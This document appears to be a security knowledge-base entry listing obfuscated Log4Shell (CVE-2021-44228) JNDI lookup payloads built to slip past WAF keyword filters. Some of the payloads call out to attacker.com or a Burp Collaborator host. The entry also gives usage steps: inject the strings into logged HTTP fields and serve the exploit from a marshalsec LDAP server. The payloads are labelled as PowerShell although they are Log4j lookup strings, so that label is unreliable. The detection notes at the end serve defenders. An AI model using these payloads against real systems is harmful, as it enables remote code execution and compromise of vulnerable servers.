---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - obfuscation
  - jndi
  - log4shell
validated: true
---

# PowerShell-JNDI-Injection-Payloads-for-Log4Shell

## Code

```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# using lower and upper
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# using env to create the letter
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```

## Description

This code snippet provides multiple obfuscated JNDI payload variations for exploiting Log4Shell (CVE-2021-44228) while bypassing WAFs. The payloads use PowerShell-like syntax for variable expansion, case mixing (e.g., ${lower:jndi}), and environment variable substitution (e.g., ${env:NaN:-j}) to evade keyword-based detection of terms like "jndi" or "ldap". These strings are injected into Log4j-logged inputs (e.g., HTTP headers) to trigger remote LDAP/RMI lookups leading to RCE. The snippet is not executed as PowerShell code but copied as payload strings.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $CALLBACK_IP | IP address or hostname of the attacker's LDAP/RMI server | 127.0.0.1 or attacker.com |
| $PORT | Port on which the LDAP/RMI server is listening | 1389 |
| $PATH | Endpoint path for the malicious reference (e.g., /a or /poc) | /a |
| $COLLABORATOR_DOMAIN | External domain for out-of-band testing (e.g., Burp Collaborator) | your.burpcollaborator.net |

## Usage

Copy one of the payload strings, substitute parameters (e.g., replace 127.0.0.1:1389 with $CALLBACK_IP:$PORT), and inject into a vulnerable application's logged field using tools like curl or Burp Suite. Start an LDAP server (e.g., with marshalsec) beforehand to serve the exploit payload. Ideal for red team engagements against WAF-protected web apps using vulnerable Log4j.

## Detection

- WAF logs showing blocked but variant JNDI patterns (e.g., mixed-case or variable-substituted).
- Application logs with anomalous ${...} expressions in user inputs.
- Network monitoring for outbound LDAP (port 389/636) or RMI (port 1099) connections to unknown domains.
- SIEM alerts on Log4j errors or JVM flags indicating JNDI activity.
- EDR detection of unexpected Java class loading from remote sources.

## Related

- [[procedures/Log4Shell-WAF-Bypass-using-JNDI-Injection]]
